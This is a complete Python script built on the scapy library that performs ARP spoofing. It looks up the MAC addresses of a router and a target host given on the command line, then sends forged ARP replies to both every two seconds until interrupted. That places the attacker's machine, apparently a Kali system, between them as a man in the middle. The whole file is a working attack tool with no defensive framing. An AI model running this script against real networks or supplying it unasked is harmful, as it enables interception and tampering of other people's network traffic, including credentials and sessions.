#!/usr/bin/env python3

from scapy.layers.l2 import Ether, ARP, srp
from scapy.all import send
import sys
import time

target_ip_ = str(sys.argv[2])
router_ip_ = str(sys.argv[1])


def get_mac_address(ip_add):
    broadcast_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = ARP(pdst=ip_add)

    packet_layer = broadcast_layer / arp_layer
    answer = srp(packet_layer, timeout=3, verbose=False)[0]

    return answer[0][1].hwsrc


target_mac_ = str(get_mac_address(target_ip_))
router_mac_ = str(get_mac_address(router_ip_))


def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)  # hwsrc -> by default is KALI MAC address
    packet2 = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)  # hwsrc -> by default is KALI MAC address
    send(packet1)
    send(packet2)


try:
    while True:
        print("Start spoof")
        spoof(router_ip_, target_ip_, router_mac_, target_mac_)
        print("Spoofing")
        time.sleep(2)
except KeyboardInterrupt:
    print("Closing ARP Spoofer")
    exit(0)
